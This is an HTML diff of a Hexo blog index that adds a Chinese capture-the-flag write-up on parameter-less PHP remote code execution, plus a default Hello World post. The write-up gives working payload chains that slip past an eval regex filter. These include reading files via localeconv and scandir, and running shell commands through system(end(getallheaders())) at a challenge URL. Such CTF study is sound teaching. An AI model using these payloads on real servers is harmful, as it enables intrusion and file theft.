@@ -187,7 +187,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -223,6 +223,228 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/01/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/avatar.jpg">
+      <meta itemprop="name" content="左">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="左">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/01/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="post-title-link" itemprop="url">无参数RCE</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">2020-11-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-11-29 12:25:10" itemprop="dateModified" datetime="2020-11-29T12:25:10+08:00">2020-11-29</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目源码：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/1.png"></p>
+<p>eval函数：php的任意代码执行</p>
+<p>GET传参，传入code参数，如果code经过正则匹配与“；”相等，就会执行eval，所以我们要看如何绕过正则，正则匹配到 <code>/[^\W]+\((?R)?\)/</code>  ，它会替换为空 ‘ ‘，然后会等于分号 ‘;’，（例如：?code=echo();      ?传参code，传入echo()，被替换为空的话，就等于分号）如果等于分号，就会绕过这个正则。</p>
+<p>正则中，\W：表示a-z、A-Z，数字，下划线。(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，(?R)? 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p>
+<p><code>/[^\W]+\((?R)?\)/</code>，只匹配<code>字符串+()</code>的类型，并且括号内为空字符串仅可以由26个小写字母组成。</p>
+<p>如：$code=”echo();”;   传入一个code是echo()，经过这个正则把它匹配到的东西替换为空，如图：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/echo.jpg"></p>
+<p>嵌套也可以被匹配，然后替换为空，如：echo(phpinfo());</p>
+<p>同上，输出：；</p>
+<p>而如果在这个参数中输入123，echo(123)，就不能匹配了：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/123.jpg"></p>
+<p>题目的意思，就是我们传入的参数，要符合函数嵌套的形式，才能绕过这个正则，然后利用echo(phpinfo());去读取flag，传入eval中</p>
+<p>那么现在就要想办法利用这种形式，以读取flag。</p>
+<p>可以通过读取网站的目录，看看目录有没有flag，用以下函数可以读取目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如图，读取了目录</p>
+<p>如果目录中有flag，那我们就可以读取flag，将下面方框中的tp5改为flag.php</p>
+<p><img src=""></p>
+<p>但是有一个问题，就是scandir这个函数含有字符”.“，而前面讲过，不能含有字符，否则正则无法被匹配。</p>
+<p>那么，就要构造这个点。</p>
+<h3 id="构造点"><a href="#构造点" class="headerlink" title="构造点"></a>构造点</h3><h5 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h5><p>localeconv()会返回当地的金融信息的数组，其第一个元素即为点。pos():取第一个元素</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(pos(localeconv()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合scandir：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/.1.jpg"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/adc13908ac2db0a22fc88c1e5cb73e8.jpg"></p>
+<p>end函数：</p>
+<p>读取数组中的最后一个元素，并输出</p>
+<p>此处数组中含多个元素，而flag文件位于最后，因此使用end，只读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p>readfile函数：读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>输入网址，查看页面源代码</p>
+<p>如图：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%BA%90%E4%BB%A3%E7%A0%81.jpg"></p>
+<h5 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h5><p>利用当前秒数构造点 ，localtime()中第46秒在Allsc码表中为点。</p>
+<p>缺点：较为麻烦，需等到46秒才能构造出点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(chr(pos(localtime())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合scandir：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="SESSIONID"><a href="#SESSIONID" class="headerlink" title="SESSIONID"></a>SESSIONID</h5><p>用session来传参，读取文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+<p>需要抓包，在cookie出传参：</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/7288f39189fe8f53a82b16bc792b6f6.jpg"></p>
+<h5 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h5><p>end读取请求头的最后一条信息，然后传入system</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>
+
+<p>输入网址：<a target="_blank" rel="noopener" href="http://47.98.234.232:28085/code.php?code=echo(system(end(getallheaders()">http://47.98.234.232:28085/code.php?code=echo(system(end(getallheaders()</a>))); </p>
+<p>然后抓包</p>
+<p>在最后一行输入ls，显示会返回flag.php</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/ls.jpg"></p>
+<p>于是再将ls改为cat flag.php，就可以读取flag了</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/cat.jpg"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/10/31/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/avatar.jpg">
+      <meta itemprop="name" content="左">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="左">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/31/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-10-31 00:21:27" itemprop="dateCreated datePublished" datetime="2020-10-31T00:21:27+08:00">2020-10-31</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-29 20:16:42" itemprop="dateModified" datetime="2020-09-29T20:16:42+08:00">2020-09-29</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
